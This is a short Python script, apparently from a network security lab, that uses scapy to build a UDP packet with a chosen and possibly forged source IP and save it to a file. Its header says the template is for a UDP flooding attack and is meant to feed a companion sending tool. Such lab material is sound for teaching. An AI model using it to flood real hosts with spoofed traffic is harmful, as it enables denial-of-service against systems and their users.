#!/usr/bin/env python3
# -*- coding: utf-8 -*-
# generate_udp.py
# generate udp packet template for udp flooding attack
# feed the generated template to send_premade_udp.
#
# Prerequisite:
#  Python3 and scapy
# Usage:
# ./generate_udp.py source_ip sport dest_ip dport pktfile
# ref: 
# 1. https://scapy.readthedocs.io
# 2. https://computingforgeeks.com/how-to-install-wireshark-on-ubuntu-desktop/
# 3. [User Datagram Protocol](https://en.wikipedia.org/wiki/User_Datagram_Protocol)
# 4. [User Datagram Protocol (UDP)](https://wiki.wireshark.org/User_Datagram_Protocol)
# 5. https://stackoverflow.com/questions/35969025/flatten-a-dictionary-to-an-argument-list-of-its-elements

import sys,os
from scapy.all import *


def genUDPpkt(sip,sPort,dip,dPort,pktfile):
  IPpkt  = IP(dst=dip,src = sip, chksum=0) # IP checksum will be filled by OS

  UDPpkt = UDP(dport=dPort, sport = sPort, chksum=0) 
  # For the the UDP chksum, scapy will fill it if set it to be 0 here. 
  # If it is set a incorrect number other than 0, scapy will keep it, and the receiver
  # will discard the udp packet, however the receiver will accept the udp packet if it's 0 
  # Note: for TCP and ICMP packets, their checksum must be explicitly and correctly setup
  # 0 or incorrect checksum will cause the packet discarded by the receiver.
  data = "Hello, UDP server!\n"
  pkt = IPpkt/UDPpkt/data
  print("-------- udp packet constructed ------------\n")
  pkt.show()

  # Save the packet data to a file
  with open(pktfile, 'wb') as f:
    f.write(bytes(pkt))
  print('-------- udp packet saved as {} ----------- \n'.format(pktfile))

if __name__ == '__main__':
	# test code
  if len(sys.argv) != 6:
    print("Usage: {} source_ip sport dest_ip dport pktfile\n".format(sys.argv[0]))
    exit(1)
  # genUDPpkt('1.2.3.4',1234,'4.3.2.1',4321,'pkt.bin')
  source_ip = sys.argv[1]
  sport = int(sys.argv[2])
  dest_ip = sys.argv[3] 
  dport = int(sys.argv[4]) 
  pktfile = sys.argv[5]
  genUDPpkt(source_ip, sport, dest_ip, dport, pktfile)